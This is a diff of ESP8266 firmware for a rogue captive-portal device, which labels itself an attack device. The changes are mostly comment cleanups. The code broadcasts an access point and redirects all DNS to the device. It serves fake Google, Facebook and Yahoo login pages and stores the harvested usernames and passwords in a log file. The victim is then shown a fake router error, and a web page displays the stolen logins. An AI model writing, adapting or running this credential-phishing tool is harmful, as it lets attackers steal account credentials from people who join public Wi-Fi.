@@ -22,15 +22,18 @@
 
 #define LOGFILE "/log.txt"
 
+// Basic configuration using common network setups (usual DNS port, IP and web server port)
 const byte DNS_PORT = 53;
 IPAddress apIP(192, 168, 1, 1);
 DNSServer dnsServer;
 ESP8266WebServer webServer(80);
 ESP8266WebServer httpServer(1337);
 
+// Buffer strings
 String webString="";
 String serialString="";
 
+// Blink the builtin LED n times
 void blink(int n)
 {
   for(int i = 0; i < n; i++)
@@ -43,16 +46,17 @@ void blink(int n)
 }
 
 void setup() {
-  //Start Serial
+  //Start Serial communication
   Serial.begin(9600);
   Serial.println();
   Serial.println("V2.0.0 - Rouge Captive Portal Attack Device");
   Serial.println();
 
+  // LED setup
   pinMode(LED_BUILTIN, OUTPUT);
   digitalWrite(LED_BUILTIN, HIGH);  
 
-  // Initialize file system and log file
+  // Initialize file system (SPIFFS) and read the log file, if not present create a new one
   Serial.print("Initializing File System (First time can take around 90 seconds)...");
   SPIFFS.begin();
   Serial.println(" Success!");
@@ -72,62 +76,61 @@ void setup() {
   }
   f.close();
   Serial.println(" Success!");
-  // End of file system block
 
-  //Create Access Point
+  // Create Access Point
   Serial.print("Creating Access Point...");
   WiFi.mode(WIFI_AP);
   WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
   WiFi.softAP(setSSID);
   Serial.println(" Success!");
 
-  //Start DNS Server
+  // Start DNS Server
   Serial.print("Starting DNS Server...");
   dnsServer.start(DNS_PORT, "*", apIP);
   Serial.println(" Success!");
 
-  //check domain name and refresh page
+  // Check domain name and refresh page
   webServer.onNotFound([]() {
     webServer.send(200, "text/html", responseHTML);
   });
 
-  //generic catch all login page for domains not listed in configuration
+  // Generic catch all login page for domains not listed in configuration
   webServer.on(SITEOTHER_redirect,[]() {
     webServer.send_P(200, "text/html", GOOGLE_HTML);
   });
 
-  //SITE1 login page
+  // SITE1 login page
   webServer.on(SITE1_redirect,[]() {
     webServer.send_P(200, "text/html", GOOGLE_HTML);
   });
 
-  //SITE2 login page
+  // SITE2 login page
   webServer.on(SITE2_redirect,[]() {
     webServer.send_P(200, "text/html", FACEBOOK_HTML);
   });
 
-  //SITE3 login page
+  // SITE3 login page
   webServer.on(SITE3_redirect,[]() {
     webServer.send_P(200, "text/html", YAHOO_HTML);
   });
 
-  //Portal login page
+  // Captive portal login page
   webServer.on(PORTALLOGIN_redirect,[]() {
     webServer.send(200, "text/html", PORTAL_LOGIN_HTML);
   });
 
-  //Validate-Save USER/PASS
+  // Validate-Save USER/PASS combinations
   webServer.on("/validate", []() {
     // store harvested credentials
     String url = webServer.arg("url");
     String user = webServer.arg("user");
     String pass = webServer.arg("pass");
 
-    // sending to serial (DEBUG)
+    // Sending data to Serial (DEBUG)
     serialString = user+":"+pass;
     Serial.println(serialString);
 
-    // saving to file
+    // Append data to log file
     File f = SPIFFS.open(LOGFILE, "a");
     f.print(url);
     f.print(":");
@@ -136,18 +139,18 @@ void setup() {
     f.println(pass);
     f.close();
     
-    // send an error response
+    // Send an error response to the user after credential harvesting
     webString = "<h1>#E701 - Router Configuration Error</h1>";
     webServer.send(500, "text/html", webString);
 
-    // reset strings
+    // Reset buffer strings
     serialString="";
     webString="";
 
     blink(5);
   });
 
-  //Log Page
+  // Logging Page
   webServer.on("/esportal/log", [](){
     webString="<html><body><a href=\"/esportal\"><- BACK TO INDEX</a><br><pre>";
     File f = SPIFFS.open(LOGFILE, "r");
@@ -161,7 +164,7 @@ void setup() {
     webString="";
   });
   
-  //Start Webserver
+  // Start Webserver
   Serial.print("Starting Web Server...");
   webServer.begin();
   httpServer.begin();
@@ -173,7 +176,7 @@ void setup() {
 }
 
 void loop() {
-  //Check for DNS Request/Dish out Web Pages
+  // Check for DNS Request/Dish out Web Pages
   dnsServer.processNextRequest();
   webServer.handleClient();
   httpServer.handleClient();
